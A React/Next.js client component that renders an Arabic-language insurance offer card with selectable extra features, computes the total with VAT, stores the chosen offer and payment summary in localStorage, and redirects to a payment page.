"use client"

import { useCallback, useEffect, useMemo, useState } from "react"
import { useRouter } from "next/navigation"
import {  updateStaute } from "@/lib/firebase"

interface OfferProps {
  offer: {
    id: string
    name: string
    type: string
    main_price: string
    company: {
      name: string
      image_url: string
    }
    extra_features: Array<{ id: string; content: string; price: number }>
    extra_expenses: Array<{ reason: string; price: number }>
  }
}

export default function OfferCard({ offer }: OfferProps) {
  const router = useRouter()
  const [selectedFeatures, setSelectedFeatures] = useState<number[]>([])
  const [totalPrice, setTotalPrice] = useState(Number.parseFloat(offer.main_price))
  const [isProcessing, setIsProcessing] = useState(false)

  // Initialize with free features selected by default
  useEffect(() => {
    const freeFeatureIndices = offer.extra_features
      .map((feature, index) => (feature.price === 0 ? index : -1))
      .filter((index) => index !== -1)
    setSelectedFeatures(freeFeatureIndices)
  }, [offer.extra_features])

  // Calculate total price based on selected features
  const calculateTotalPrice = useCallback(() => {
    const basePrice = Number.parseFloat(offer.main_price)
    const featuresPrice = selectedFeatures.reduce((total, index) => {
      return total + offer.extra_features[index].price
    }, 0)
    return basePrice + featuresPrice
  }, [offer.main_price, selectedFeatures, offer.extra_features])

  // Update total price when selected features change
  useEffect(() => {
    setTotalPrice(calculateTotalPrice())
  }, [selectedFeatures, calculateTotalPrice])

  // Handle feature selection/deselection
  const handleFeatureSelection = useCallback((index: number, checked: boolean) => {
    setSelectedFeatures((prev) => (checked ? [...prev, index] : prev.filter((i) => i !== index)))
  }, [])

  // Get Arabic insurance type name
  const getArabicInsuranceType = useMemo(
    () => (type: string) => {
      const types = {
        "against-others": "ضد الغير",
        comprehensive: "شامل",
        special: "مميز",
      }
      return types[type as keyof typeof types] || type
    },
    [],
  )

  // Handle offer selection and navigate to payment
  const handleOfferSelection = useCallback(async () => {
    setIsProcessing(true)

    try {
      // Get insurance details from localStorage
      const insuranceDetails = JSON.parse(localStorage.getItem("insuranceDetails") || "{}")

      const endDate = new Date(new Date().setFullYear(new Date().getFullYear() + 1)).toISOString().split("T")[0]

      // Create selected offer data
      const selectedOfferData = {
        id: offer.id,
        name: offer.name,
        company_id: crypto.randomUUID(),
        type: offer.type,
        main_price: Number.parseFloat(offer.main_price),
        selectedFeatures: selectedFeatures.map((index) => ({
          ...offer.extra_features[index],
          id: offer.extra_features[index].id,
        })),
        totalPrice,
        company: offer.company,
        purchaseDate: new Date().toISOString(),
        insuranceDetails,
      }
      const _id = localStorage.getItem("visitor")
      // Simulate API call
      if (_id) {
        updateStaute('idle',_id)
      }

      // Store in localStorage
      const existingOffers = JSON.parse(localStorage.getItem("selectedOffers") || "[]")
      existingOffers.push(selectedOfferData)
      localStorage.setItem("selectedOffers", JSON.stringify(existingOffers))

      // Store payment details in localStorage instead of Redux
      const paymentDetails = {
        policyDetails: {
          insurance_type: getArabicInsuranceType(offer.type),
          company: offer.company.name,
          start_date: insuranceDetails.start_date,
          endDate,
          referenceNumber: Math.floor(100000000 + Math.random() * 900000000).toString(),
        },
        summaryDetails: {
          subtotal: totalPrice,
          vat: 0.15,
          total: totalPrice * 1.15,
        },
      }
      localStorage.setItem("paymentDetails", JSON.stringify(paymentDetails))

      // Navigate to payment page
      window.location.href="/payment"
      router.push("/payment")
    } catch (error) {
      console.error("Error processing offer selection:", error)
      alert("حدث خطأ أثناء معالجة طلبك. يرجى المحاولة مرة أخرى.")
    } finally {
      setIsProcessing(false)
    }
  }, [offer, totalPrice, selectedFeatures, getArabicInsuranceType, router])

  return (
    <div className="bg-white container mx-auto rounded-xl overflow-hidden border border-gray-100 hover:border-blue-200 transition-all duration-300">
      <div className="relative flex flex-col lg:flex-row">
        {/* Company Logo Section */}
        <div className="w-full lg:w-1/4 p-1 sm:p-6 lg:p-8 flex flex-col items-center justify-center bg-gray-50">
          <span
            className="mb-4 relative inline-block px-4 sm:px-6 py-1.5 sm:py-2 text-sm font-bold text-white 
            bg-gradient-to-r from-blue-600 to-blue-400 shadow-lg rounded-full
            transform hover:scale-105 transition-all duration-300 hover:shadow-xl active:scale-100"
          >
            {getArabicInsuranceType(offer.type)}
          </span>
          <img
            src={offer.company.image_url || "/placeholder.svg"}
            alt={`شعار ${offer.company.name}`}
            className="h-20 sm:h-24 lg:h-28 object-contain transform hover:scale-105 transition-transform duration-300"
            loading="lazy"
          />
        </div>

        {/* Features Section */}
        <div className="w-full lg:w-2/4 p-1 sm:p-6">
          <h3 className="text-lg sm:text-xl font-bold mb-4 sm:mb-6 text-gray-800 border-b pb-3">المنافع الإضافية</h3>
          <div className="space-y-3 sm:space-y-4">
            {/* Feature items with responsive spacing */}
            {offer.extra_features.map((feature, index) => (
              <label
                key={index}
                className={`flex items-center p-3 sm:p-1 rounded-lg transition-all duration-200 ${
                  feature.price === 0 ? "bg-[#ddd]/50 cursor-default" : "hover:bg-gray-50 cursor-pointer"
                }`}
              >
                <input
                  type="checkbox"
                  checked={selectedFeatures.includes(index)}
                  disabled={feature.price === 0}
                  onChange={(e) => handleFeatureSelection(index, e.target.checked)}
                  className="ml-3 sm:ml-4 h-4 sm:h-5 w-4 sm:w-5 text-blue-600"
                />
                <div className="flex-1 border-b p-1">
                  <span className="text-sm sm:text-base text-gray-800 font-medium">{feature.content}</span>
                </div>
                {feature.price > 0 && (
                  <span className="text-sm sm:text-base text-gray-700 font-bold whitespace-nowrap">
                    {feature.price} ريال
                  </span>
                )}
              </label>
            ))}
          </div>
        </div>

        {/* Price Section */}
        <div className="w-full lg:w-1/4 p-1 sm:p-6 lg:p-8 bg-gradient-to-b from-gray-50 to-white flex flex-col justify-center border-t lg:border-t-0 lg:border-r">
          <div className="text-center space-y-4 sm:space-y-6">
            <div>
              <span className="block text-xs sm:text-sm text-gray-500 mb-2">السعر النهائي</span>
              <span className="text-2xl font-bold text-blue-600">{totalPrice.toFixed(2)} ريال</span>
            </div>
            <button
              onClick={handleOfferSelection}
              disabled={isProcessing}
              className="w-full sm:w-2/3 lg:w-1/2 bg-blue-50 hover:bg-[#ff9000] active:bg-[#f08800] text-white font-bold py-1 sm:py-4 px-4 sm:px-6 rounded-lg shadow-md hover:shadow-lg transform hover:-translate-y-0.5 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isProcessing ? (
                <div className="flex items-center justify-center gap-2">
                  <span className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></span>
                  جاري المعالجة...
                </div>
              ) : (
                "شراء الان"
              )}
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

